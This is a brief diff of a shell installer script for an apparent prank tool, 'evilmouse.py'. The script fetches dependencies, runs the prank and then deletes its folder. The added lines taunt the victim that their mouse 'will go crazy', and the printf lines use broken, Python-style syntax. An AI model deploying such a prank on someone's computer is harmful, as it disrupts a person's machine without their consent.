@@ -10,6 +10,9 @@ wget https://raw.githubusercontent.com/eLVee1991/Trolls/master/requirements.txt
 virtualenv venv
 . venv/bin/activate
 pip3 install -r requirements.txt
+printf "-"*60 "/n"
+echo "Trolling you now. You're fucked for a while. Your mouse will go crazy."
+printf "-"*60 "/n"
 python3 evilmouse.py
 cd "$HOME/Desktop"
 rm -rf evilmouse
